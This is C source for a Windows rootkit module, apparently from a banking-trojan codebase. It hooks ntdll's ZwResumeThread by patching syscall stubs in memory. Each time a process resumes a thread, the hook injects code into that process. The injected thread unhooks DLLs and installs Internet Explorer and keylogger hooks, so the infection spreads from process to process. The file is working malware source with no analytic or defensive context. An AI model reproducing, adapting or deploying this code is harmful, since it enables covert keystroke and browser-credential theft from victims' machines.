#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"
#include "Splice.h"
#include "Inject.h"
#include "Rootkit.h"
#include "Unhook.h"

#include "InternetExplorer.h"
#include "Java.h"
#include "KeyLogger.h"

#include "ntdll.h"


DWORD dwAddrDirProc; // ZwQueryDirectoryFile hook
DWORD dwAddrRthProc; // ZwResumeThread hook
DWORD dwAddrOpfProc; // ZwOpenFile hook
DWORD dwAddrCrfProc; // ZwCreateFile hook


typedef NTSTATUS ( WINAPI *PZwQueryDirectoryFile )( HANDLE  FileHandle, HANDLE  Event,
							   PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext,
							   PIO_STATUS_BLOCK  IoStatusBlock, PVOID  FileInformation,
							   ULONG  Length, FILE_INFORMATION_CLASS  FileInformationClass,
							   BOOLEAN  ReturnSingleEntry, PUNICODE_STRING  FileName,
							   BOOLEAN  RestartScan  );


PZwQueryDirectoryFile ZwQueryDirectoryFileReal;


void ProtectPage( LPVOID lpAddr, DWORD dwParams )
{
	DWORD dwOldProt = 0;
	pVirtualProtectEx( (HANDLE)-1, lpAddr, 1024, dwParams, &dwOldProt );
}

typedef NTSTATUS ( WINAPI *PZwResumeThread )( HANDLE hThread, PULONG PreviousSuspendCount );
PZwResumeThread ZwResumeThreadReal;

DWORD WINAPI RootkitThread( LPVOID lpData )
{
	//DbgMsgW(L"RootkitThread?",1,L"");
	
	UnhookDlls();
	HookZwResumeThread();	

	
	//DbgMsgW(L"RootkitThread end?",1,L"");

	if ( HookInternetExplorer() )
	{
		return 0;
	}

	//if ( HookJava() )
	//{
	//	return 0;
	//}

	if ( HookKeyLogger() )
	{
		return 0;
	}
	
	return 0;
}

DWORD GetPidByThread( HANDLE hThread )
{
	THREAD_BASIC_INFORMATION Threads;
	DWORD dwReturnLen;

	if ( pZwQueryInformationThread( hThread, ThreadBasicInformation, &Threads, sizeof( THREAD_BASIC_INFORMATION ), &dwReturnLen ) == STATUS_SUCCESS )
	{
		return (DWORD)Threads.ClientId.UniqueProcess;
	}

	return -1;
}

LPDWORD dwHashPid;
DWORD dwPidCount;

void AddPid( DWORD dwPid )
{
	if ( dwHashPid == NULL )
	{
		if ( ( dwHashPid = (LPDWORD)MemAlloc( sizeof( LPDWORD ) ) ) == NULL )
		{
			return;
		}
	}
	else
	{
		LPDWORD p = (LPDWORD)MemRealloc( dwHashPid, GetMemSize( dwHashPid ) + ( sizeof( LPDWORD ) * ( dwPidCount + 1 ) ) );

		if ( p == NULL )
		{
			return;
		}

		dwHashPid = p;
	}

	dwHashPid[ dwPidCount ] = dwPid;
	dwPidCount++;

	return;
}

bool FindPid( DWORD dwPid )
{
	for ( DWORD i = 0; i < dwPidCount; i++ )
	{
		if ( dwHashPid[i] == dwPid )
		{
			return true;
		}
	}

	return false;
}


NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount )
{
	DWORD dwPid = GetPidByThread( hThread );

	if ( dwPid != -1 && dwPid != (DWORD)pGetCurrentProcessId() )
	{
		if ( !FindPid( dwPid ) )
		{
			OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;
			CLIENT_ID ClientID;

			ClientID.UniqueProcess = (HANDLE)dwPid;
			ClientID.UniqueThread  = 0;

			HANDLE hProcess = NULL;
			
			if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) == STATUS_SUCCESS )
			{
				DWORD dwAddr = InjectCode( hProcess, RootkitThread );

				if ( dwAddr != -1 )
				{
					if ( (NTSTATUS)pZwQueueApcThread( hThread, (LPTHREAD_START_ROUTINE)dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS ) 
					{
						AddPid( dwPid );
					}
				}

				pZwClose( hProcess );
			}		
		}
	}

	return ZwResumeThreadReal( hThread, PreviousSuspendCount );
}

__declspec( naked ) void JmpToHookRthProc()
{
	__asm
	{
		pop eax
		lea eax,ZwResumeThreadHook
		jmp eax
		retn
	}
}

void HookZwResumeThread()
{
	dwHashPid  = NULL;
	dwPidCount = 0;

	dwAddrRthProc = (DWORD)&JmpToHookRthProc;
	DWORD dwAddr  = (DWORD)&dwAddrRthProc;

	PZwResumeThread ZwResumeThread = (PZwResumeThread)GetProcAddressEx( NULL, 5, 0xACF8BF39 );
	
	LPVOID lpMem;
	LPVOID lpPtr;

	lpPtr = (LPVOID)ZwResumeThread;

	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );

	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if ( lpMem == NULL )
	{
		return;
	}

	ZwResumeThreadReal =  (PZwResumeThread)lpMem;

	m_memcpy( lpMem, lpPtr, 15 );

	lpPtr = (LPVOID)((DWORD)lpPtr + 5 );

	if ( *(BYTE*)lpPtr == 0xBA ) // win xp and up
	{
		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
		m_memcpy( lpPtr, &dwAddr, 4 );
	}
	else
	{
		if ( *(BYTE*)lpPtr == 0x8D ) //win2000
		{
			*(BYTE*)lpPtr = 0x68;
			dwAddr		  = (DWORD)&ZwResumeThreadHook;
			lpPtr		  = (LPVOID)((DWORD)lpPtr + 1 );

			m_memcpy( lpPtr, &dwAddr, 4 );

			lpPtr		  = (LPVOID)((DWORD)lpPtr + 6 );

		
			*(BYTE*)lpPtr = 0x00;
		}
		else
		{
			MemFree( lpMem );
		}
	}

	ProtectPage( ZwResumeThread, PAGE_EXECUTE_READ );

	return;
}







